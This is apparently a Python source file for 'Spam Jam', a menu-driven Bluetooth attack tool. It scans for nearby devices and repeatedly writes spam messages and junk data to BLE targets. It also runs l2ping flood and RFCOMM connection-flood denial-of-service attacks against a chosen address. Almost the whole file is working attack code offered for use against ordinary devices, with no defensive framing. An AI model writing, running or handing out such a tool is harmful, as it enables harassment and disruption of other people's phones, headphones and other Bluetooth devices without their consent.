import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, BTLEException

# 🎨 Spam Jam & Party Pooper Banner
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
   ❤️💜 A WORLD OF BLE FUN 💜❤️
   👩‍💻 Author: ekoms savior
   🎯 Now with MORE Custom Attacks! 🎉
   """)
    print("💜 XOXO HACK THE PLANET! 💜\n")

# 🎯 BLE Spamming Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        print(f"🔔 Notification from BLE device: {data}")

# 🚀 BLE Spamming with User Input!
def spam_ble():
    target_mac = input("💜 Enter target BLE MAC address: ")
    print(f"🚀 Spamming device {target_mac} 💥💜")
    custom_message = input("💜 Enter your custom spam message: ").encode()

    try:
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
        peripheral.setDelegate(BLESpam())
        while True:
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
            time.sleep(0.5)
    except Exception as e:
        print(f"⚠️ Error: {e}")

# 🎯 BLE Jamming Function
def jam_ble():
    print("🔎 Scanning for BLE devices to jam 📡")
    scanner = Scanner()
    devices = scanner.scan(10.0)

    if not devices:
        print("⚠️ No BLE devices found. Try again!")
        return

    for idx, device in enumerate(devices):
        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

    try:
        device_idx = int(input("💜 Enter the index of the device to jam: "))
        target_device = devices[device_idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid index.")
        return

    print(f"💥 Jamming device {target_device} 🚀💜")
    try:
        peripheral = Peripheral(target_device)
        while True:
            junk_data = b'\x00\xFF' * 50
            peripheral.writeCharacteristic(0x000b, junk_data, withResponse=False)
            print(f"🚀 Jammed {target_device} with noise 💜💥")
            time.sleep(0.1)
    except BTLEException as e:
        print(f"⚠️ Failed to jam {target_device}: {e}")

# 🦠 Party Pooper Features 🦠
def start_bluetooth():
    """Start the Bluetooth service if not running."""
    print("📡 Starting Bluetooth service...")
    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
    print("✅ Bluetooth service started!")

# 🔎 Bluetooth Device Scanner (FIXED!)
def scan_bluetooth():
    print("🔎 Scanning for Bluetooth devices... (This may take a few seconds)\n")
    
    try:
        scanner = Scanner()
        devices = scanner.scan(10.0)

        if not devices:
            print("⚠️ No Bluetooth devices found. Try again!")
        else:
            print("📡 Found Bluetooth Devices:")
            for idx, device in enumerate(devices):
                print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

    except Exception as e:
        print(f"⚠️ Error running Bluetooth scan: {e}")

    print("\n✅ Scan complete!\n")

# 💥 CUSTOM L2PING FLOOD ATTACK
def l2ping_attack():
    addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")

    if os.geteuid() != 0:
        print("⚠️  L2Ping requires root privileges! Try running: sudo python3 spam_jam.py")
        return

    packet_size = input("💜 Enter packet size (default 600, max 672): ") or "600"

    try:
        packet_size = int(packet_size)
        if packet_size > 672:
            print("⚠️ Packet size too large! Setting to max allowed: 672 bytes.")
            packet_size = 672  
    except ValueError:
        print("⚠️ Invalid input! Using default size: 600 bytes.")
        packet_size = 600  

    attack_mode = input("💜 Flood mode? (y/n): ").lower() == "y"

    if attack_mode:
        print(f"💥 Flooding {addr} with {packet_size}-byte L2Ping packets!")
        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), '-f', addr], check=True)
    else:
        print(f"💥 Sending single {packet_size}-byte L2Ping packet to {addr}")
        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), addr], check=True)

    print("✅ L2Ping attack complete!")

# ✅ RFCOMM FLOOD FUNCTION!
def rfcomm_flood():
    addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")

    if not addr:
        print("⚠️ No address entered. Exiting RFCOMM flood.")
        return

    try:
        duration = int(input("💜 Enter flood duration in seconds (default 30): ") or "30")
    except ValueError:
        print("⚠️ Invalid input! Using default duration of 30 seconds.")
        duration = 30  

    print(f"💥 Starting RFCOMM connection flood on {addr} for {duration} seconds...")

    start_time = time.time()
    attempt = 0

    while time.time() - start_time < duration:
        try:
            attempt += 1
            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True, timeout=10)  
            print(f"✅ Attempt {attempt}: Connected to {addr}")
        except subprocess.TimeoutExpired:
            print(f"⚠️ Attempt {attempt}: Connection timed out to {addr}, skipping...")
        except subprocess.CalledProcessError:
            print(f"⚠️ Attempt {attempt}: Connection failed to {addr}")
        except KeyboardInterrupt:
            print("⚠️ Stopped by user. Exiting RFCOMM flood.")
            break

    print("✅ RFCOMM flood completed!")

# 🏁 Main Function
def main():
    print_banner()
    while True:
        print("\n🔹 1️⃣ Spam a BLE device 💌")
        print("🔹 2️⃣ Jam a BLE device 🚫")
        print("🔹 3️⃣ Scan for Bluetooth devices 📡")
        print("🔹 4️⃣ L2Ping Attack 💥")
        print("🔹 5️⃣ RFCOMM Flood 💥")
        print("🔹 6️⃣ Start Bluetooth Service 📡")
        print("🔹 7️⃣ Quit 🚪")

        choice = input("💜 Choose an option (1-7): ")
        functions = [spam_ble, jam_ble, scan_bluetooth, l2ping_attack, rfcomm_flood, start_bluetooth]

        if choice == "7":
            print("👋 Goodbye, fren! XOXOXO 💜")
            sys.exit()
        elif choice in "123456":
            functions[int(choice)-1]()

if __name__ == "__main__":
    main()
